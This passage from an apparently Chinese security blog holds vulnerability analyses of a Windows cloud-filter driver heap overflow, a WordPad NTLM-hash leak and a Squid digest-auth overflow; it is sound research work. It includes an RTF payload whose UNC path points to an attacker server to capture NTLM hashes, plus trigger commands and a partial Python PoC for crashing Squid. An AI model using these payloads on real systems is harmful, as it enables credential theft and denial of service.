BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { return IsReparseBufferSupported; } v26 = 24i64; goto LABEL_163; } if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; 通过构造ElementInfos[0]和ElementInfos[1]可以通过HsmpRpValidateBuffer校验，而后漏洞触发点会读取ElementInfos[10]的数据和Length通过memcpy进行拷贝，所以还需要构造ElementInfos[10]的数据，并且ElementInfos[10]的Length需要超过目标缓冲区，特别的在计算CRC32后，需要通过RtlCompressBuffer压缩目标数据，并放入到FileData处。\n构造多大的缓冲区？根据前面补丁分析，在补丁中限制了ReparseDataLength \u0026lt; 0x4000，所以超过四千的部分会造成溢出，如果想溢出8个字节则需要构造0x4008 + 8 = 0x4010，依此类推，在构造缓冲区时。\n如何将构造好的数据传递给驱动并在目标位置触发呢？在网上查到有类似漏洞分析文章\rWindows云文件迷你过滤器驱动程序中的提权漏洞(CVE-2021-31969)，不难看出CVE-2021-31969修复和本次分析的漏洞CVE-2023-36036修复位置类似，都对ReparseDataLength进行了判断，所以本次PoC编写也可以借鉴。\n在CVE-2021-31969分析文章中贴出了部分PoC，结合这部分PoC和前面的结构体，写出PoC也就不难了。\n动态调试\n在如下两个位置下断点\nbp cldflt!HsmpRpCommitNoLock bp cldflt!HsmpRpCommitNoLock+0x13de 运行poc，可以看到已经进入HsmpRpCommitNoLock函数\n1: kd\u0026gt; g Breakpoint 0 hit cldflt!HsmpRpCommitNoLock: fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx 继续运行，触发第二个断点\n0: kd\u0026gt; g Breakpoint 1 hit cldflt!HsmpRpCommitNoLock+0x13de: fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380) 此时memmove已经被优化为memcpy，而要拷贝的长度为0x3f94，dst所在的堆大小为0x4000，dst指向偏移0x74处，最多有0x3f8c大小，所以memcpy拷贝时会越界写入8个字节，造成堆溢出。\n1: kd\u0026gt; rr8 r8=0000000000003f94 1: kd\u0026gt; !pool rcx Pool page ffffd980717f7074 region is Paged pool *ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes Owning component : Unknown (update pooltag.txt) 继续运行，则在memcpy内部触发异常，因为尝试往未分配的内存里面写入00\n0: kd\u0026gt; u cldflt!memcpy+0x165: fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0 0: kd\u0026gt; !pool rcx - 0x10 Pool page ffffe5028e4fa000 region is Paged pool ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool... ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page 0: kd\u0026gt; rxmm0 mm0=0000000000000000 对应代码为\nif ( v25 ) *(_OWORD *)(v15 + v25 - 16) = *(_OWORD *)(v15 + v25 - 16 + v13); *(__m128 *)(v15 - 0x10) = v14; 以下为调用栈\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus 01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12 02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946 03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107 04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff 05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400 06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358 07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161 08 fffffb8a`8a45f0f0 fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3 09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f 0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443 0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5 0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4 0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c 0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca 0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541 10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf 11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55 12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c 13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71 14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56 15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25 16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14 17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f 18 00000056`01aff5c8 00000000`00000000 0x1bc PoC会在过几天上传到GitHub\nhttps://github.com/Chestnuts4/POC 小结 本次漏洞分析离不开业内前辈逆向得出的_HSM_REPARSE_DATA结构体信息，这个结构体微软没有公开的文档，相关资料也很少。可以看到早在2018年，就已经逆向出了HSM相关数据结构信息。目前只有这一个仓库有相关信息，向前辈致敬。\n/*****************************************************************************/ /* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */ /*---------------------------------------------------------------------------*/ /* Interface of the HSM reparse data structures */ /*---------------------------------------------------------------------------*/ /* Date Ver Who Comment */ /* -------- ---- --- ------- */ /* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */ /*****************************************************************************/ 这里引用一下前辈的主页。\nhttps://www.zezula.net/en/tools/main.html\n整体来看，这个漏洞原理和触发方式较为简单，在使用memcpy之前没有校验长度，而修复也简单，再解压之前验证长度是否超过0x4000，超过则认为数据有错，进入到错误逻辑，从而在源头阻止了触发漏洞逻辑。\n在漏洞修复处在修复上个整数下溢的漏洞时，开发人员只修复当时的整数下溢漏洞，没有去考虑长度会不会过长，某些程度来说这也是开发的粗心大意导致了这个漏洞留到现在。\n在编写PoC参考了其他安全研究员已有的分析。\n至于Exploit部分还得再研究一下。\n参考链接\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036\nhttps://zhuanlan.zhihu.com/p/392194464\nhttps://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror\nhttps://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference\nhttps://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions\nhttps://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/\nCreated at 2023-11-24T15:49:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"漏洞分析","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/","title":"CVE-2023-36563 Wordpad Info Disclosure 分析","tags":["漏洞分析"],"description":"","content":"基本信息 wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。\n影响版本 略\n环境搭建 windows 10 21h2 2023-09补丁 技术分析\u0026amp;调试 初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞\rCVE-2023-23397 outlook 权限提升漏洞，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。\n补丁diff\ndiff wordpad.exe，可以看到修改了如下函数 同时在修复后的wordpad.exe中新增了QueryConvertOLELinkCallback函数和_LoadImageWithWIC_0，根据微软的函数命名规则，QueryConvertOLELinkCallback可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。 附上AI解释 对比各个修改后的函数，可以看出LoadImageResource为加载Image的资源节里面的资源，不是很符合我们之前的假设 回到补丁新增的函数中，对于新增的函数QueryConvertOLELineCallback，其在CRichEdit2View::OnCreate函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了SendMessageW，目标窗口可以取出这个回调函数指针并调用\n分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。 ole对象相关功能由ole32.dll实现，diff ole32.dll，主要修改了如下函数\nOLESTREAMToGenericObject wConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorageEx 新增了如下函数\nIsAppExcludedFromOLELinkConversionRegistrySetting CheckOLELinkConversionRegistrySetting FindStringInMultiString OleConvertOLESTREAMToIStorage2 OleConvertOLESTREAMToIStorageEx2 在OLESTREAMToGenericObject函数diff中可以看到调用了wordpad中传递的函数指针QueryConvertOLELineCallback，并使用PrependUNCName将szUNC添加UNC路径后赋给a2-\u0026gt;m_szTopic。 因此可以得出结论：该漏洞是将ole对象的m_szTopic作为UNC路径进行访问。\n谷歌搜索OLESTREAMToGenericObject，在其他安全研究员发表的\r其他ole漏洞分析中看到了如下\nOLE格式可以在\rOLD微软官方文档中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。 根据\r微软文档，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。\nlinked object: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.\n通过wordpad创建一个rtf文件并嵌入ole对象，使用编辑器打开可以看到如下，根据文档可知该ole对象类型为EmbedObject\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052 fff{\\object\\objemb{\\*\\objclass PBrush}\\objw2835\\objh2835{\\*\\objdata 01050000 02000000 07000000 50427275736800 00000000 00000000 a0a30100 424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000 000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 下载\role tools，查看wordpad生成的rtf文件信息\n➜ rtfobj.exe .\\test.rtf rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: \u0026#39;.\\\\test.rtf\u0026#39; - size: 661865 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |00000118h |format_id: 2 (Embedded) | |class name: b\u0026#39;PBrush\u0026#39; | |data size: 107424 | |MD5 = \u0026#39;6eb1e875d3759af5e4b65cd324182471\u0026#39; ---+----------+--------------------------------------------------------------- 我们知道Topic属性是触发漏洞的关键，通过查看ole文档找到了关键信息，如果LinkedObject包含了ObjectHeader结构，则TopicName必须包含指向链接的文件路径，这个路径必须是绝对路径或者是UNC路径 所以我们可以将UNC路径设置为我们的恶意服务器，重新构造rtf文件，成功触发\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}{\\*\\mmathPr\\mdispDef1\\mwrapIndent1440 }\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052{\\object\\objemb{\\*\\objclass Word.Document.8}\\objw585\\objh795{\\*\\objdata 01050000 01000000 10000000 576f72642e446f63756d656e742e3800 17000000 5c5c3139322e3136382e35322e3135365c312e72746600 00000000 00000000 00000000 00000000 01050000 05000000 10000000 576f72642e446f63756d656e742e3800 0e000000 74400000 0100090000033a20000009001610000000001610000026060f002220574d464301000000000001 注意到即使设置了MotW，虽然wordpad会显示警告，但仍然会访问Topic指向的资源，在procmonitor中可以看到如下事件 补丁和缓解措施分析\n微软在补丁日后发布了\r一篇文章，指出可以在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole\\AppCompat\\OLELinkConversionFromOLESTREAMToIStorage中添加DWORD的Disabled值0x00000001来禁用，但我在win 10 21h2 9月补丁中应用了此方法，但不起作用，wordpad没有读取这个注册表。打开文件后仍然访问了UNC路径，泄露了NTLM hash\n在前文补丁分析中已知，wordpad会传递回调函数给ole32一个回调函数，在ole32中，会先检查注册表是否禁用了ole对象链接转换，而后检查当前进程是否在白名单内，最后而后调用用户提供的回调函数，以运行用户自定义的规则。\nPoC构造\n打开wordpad，插入一个rtf对象，而后将Topic的长度和name字段替换为UNC路径即可，稍晚俩天poc会公布在我的GitHub\nhttps://github.com/Chestnuts4/POC 小结 这个漏洞和预想中一样，是由于某个属性可以被设置为UNC路径，而后wordpad会访问这个UNC路径，虽然文件设置了MotW标识，wordpad显示了警告，但反常的是wordpad仍然在用户没有同意的情况下访问了目标UNC路径，这一点比较反直觉。\n参考链接\nhttps://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/\nhttps://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/\nCreated at 2023-10-31T17:12:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/","title":"Squid Dos","tags":["漏洞分析"],"description":"","content":"基本信息 开启了digest身份认证的squid代理服务器存在堆溢出漏洞，未经身份验证的攻击者可以利用该漏洞造成拒绝服务。\n指纹 hunter\nweb.title=\u0026#34;ERROR The requested URL could not be retrieved\u0026#34; 影响版本 squid\n3.2.0.1-5.9, 6.0-6.3 环境搭建 按照configure脚本的提示安装各个依赖，而后执行如下：\nexport C_INCLUDE_PATH=/usr/include/libxml2 export CPLUS_INCLUDE_PATH=/usr/include/libxml2 ./configure \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/root/squid/squid-6.3/build\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--disable-option-checking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;--libdir=${prefix}/lib/x86_64-linux-gnu\u0026#39; \u0026#39;--runstatedir=/run\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;BUILDCXX=g++\u0026#39; \u0026#39;--with-build-environment=default\u0026#39; \u0026#39;--enable-build-info=Debian linux\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,SMB_LM\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-security-cert-validators=fake\u0026#39; \u0026#39;--enable-storeid-rewrite-helpers=file\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;--without-systemd\u0026#39; \u0026#39;--with-gnutls\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;LDFLAGS=-Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;--disable-optimizations\u0026#39; 配置在squid.conf添加如下\nauth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest auth_param digest realm localhost acl authenticated proxy_auth REQUIRED http_access allow authenticated http_port 3128 test:localhost:39df1982ed1fef9f74ecd670a2a93c66 使用如下请求触发\ncurl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest 技术分析\u0026amp;调试 补丁分析\n补丁修复于src\\auth\\digest\\Config.cc，可以看出补丁主要是对value.size进行了判断，在修复前虽然判断了value.size()是否为8，但仅仅打印了一条调试信息，后面仍然调用xstrncpy进行复制。 在补丁处如果nc参数不是8则不会调用xstrncpy进行复制。 而xstrncpy要写入的长度参数来源于value.size()，value是一个String类型变量\ncase DIGEST_NC: if (value.size() != 8) { debugs(29, 9, \u0026#34;Invalid nc \u0026#39;\u0026#34; \u0026lt;\u0026lt; value \u0026lt;\u0026lt; \u0026#34;\u0026#39; in \u0026#39;\u0026#34; \u0026lt;\u0026lt; temp \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); } xstrncpy(digest_request-\u0026gt;nc, value.rawBuf(), value.size() + 1); debugs(29, 9, \u0026#34;Found noncecount \u0026#39;\u0026#34; \u0026lt;\u0026lt; digest_request-\u0026gt;nc \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); break; char * xstrncpy(char *dst, const char *src, size_t n) { char *r = dst; if (!n || !dst) return dst; if (src) while (--n != 0 \u0026amp;\u0026amp; *src != \u0026#39;\\0\u0026#39;) { *dst = *src; ++dst; ++src; } *dst = \u0026#39;\\0\u0026#39;; return r; } 可以看出这是一个越界写漏洞，可以造成堆溢出。 动态调试\n断点如下\ngef➤ b Auth::Digest::Config::decode gef➤ b Config.cc:829 通过curl触发断点\ncurl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest 此时调用栈如下\ngef➤ bt #0 Auth::Digest::Config::decode (this=0x55a2e598a470, proxy_auth=0x55a2e5cc50e7 \u0026#34;username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830 #1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser ( proxy_auth=0x55a2e5cc50e0 \u0026#34;Digest username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, al=...) at SchemeConfig.cc:55 #2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354 #3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453 #4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57 #5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55 #6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171 #7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40, child=0x55a2e598ac40) at Checklist.cc:93 #8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40) at BoolOps.cc:76 #9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91 #10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171 #11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50, child=0x55a2e598bc50) at Checklist.cc:93 #12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, checklist=0x55a2e611ec88, start=0x55a2e598bc50) at BoolOps.cc:114 #13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91 #14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171 #15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295 #16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88, callback_=0x55a2e4749b13 \u0026lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)\u0026gt;, callback_data_=0x55a2e611e8b8) at Checklist.cc:254 #17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660 #18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704 #19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608 #20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697 #21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759 #22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284 #23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948 #24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982 #25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183 #26 0x000055a2e48b8250 in CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt;::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190 #27 0x000055a2e48b832b in JobDialer\u0026lt;Server\u0026gt;::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175 #28 0x000055a2e48b8137 in AsyncCallT\u0026lt;CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt; \u0026gt;::fire (this=0x55a2e6117420) at ../../src/base/AsyncCall.h:147 #29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44 #30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27 #31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144 #32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121 #33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83 #34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661 #35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353 #36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341 在gdb中可以看到value值为传入的请求的nc的值\ngef➤ p value $1 = { static npos = 0xffffffffffffffff, size_ = 0x28, len_ = 0x8, static SizeMax_ = 0xffff, buf_ = 0x55a2e6125a60 \u0026#34;00000001\u0026#34; } 长度为nc的长度，此时只需要nc长度超过目标缓冲区 digest_request-\u0026gt;nc即可造成堆溢出。查看 digest_request定义可知nc大小为9\nclass UserRequest : public Auth::UserRequest { MEMPROXY_CLASS(Auth::Digest::UserRequest); public: UserRequest(); ~UserRequest() override; int authenticated() const override; void authenticate(HttpRequest * request, ConnStateData * conn, Http::HdrType type) override; Direction module_direction() override; void addAuthenticationInfoHeader(HttpReply * rep, int accel) override; #if WAITING_FOR_TE virtual void addAuthenticationInfoTrailer(HttpReply * rep, int accel); #endif void startHelperLookup(HttpRequest *request, AccessLogEntry::Pointer \u0026amp;al, AUTHCB *, void *) override; const char *credentialsStr() override; char *noncehex; /* \u0026#34;dcd98b7102dd2f0e8b11d0f600bfb0c093\u0026#34; */ char *cnonce; /* \u0026#34;0a4f113b\u0026#34; */ char *realm; /* = \u0026#34;testrealm@host.com\u0026#34; */ char *pszPass; /* = \u0026#34;Circle Of Life\u0026#34; */ char *algorithm; /* = \u0026#34;md5\u0026#34; */ char nc[9]; /* = \u0026#34;00000001\u0026#34; */ char *pszMethod; /* = \u0026#34;GET\u0026#34; */ char *qop; /* = \u0026#34;auth\u0026#34; */ char *uri; /* = \u0026#34;/dir/index.html\u0026#34; */ char *response; digest_request为Auth::Digest::UserRequest指针，使用new分配内存，位于堆内\nPoC构造\n漏洞代码对应于处理[[../06 Protocol/HTTP digest身份认证|HTTP digest 认证]]，通过该认证请求需要发送两次请求，第一次不携带认证头，此时squid会返回407，需要提取响应中的nonce，简单的使用python即可构造 PoC\nimport requests from requests.auth import HTTPDigestAuth import random import string import hashlib proxies={ \u0026#39;http\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39;, \u0026#39;https\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39; } resp_407=\u0026#34;\u0026#34;\u0026#34; Digest realm=\u0026#34;localhost\u0026#34;, nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;, qop=\u0026#34;auth\u0026#34;, stale=false\u0026#34;\u0026#34;\u0026#34; rr=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;test\u0026#34;,realm=\u0026#34;localhost\u0026#34;,nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;,uri=\u0026#34;/\u0026#34;,cnonce=\u0026#34;a0824a23a0394203c3023085915fd744\u0026#34;,nc=00000001,response=\u0026#34;b45560b922d64786ef7d6c96c9071dfa\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; data=\u0026#39;\u0026#39;\u0026#39;Digest 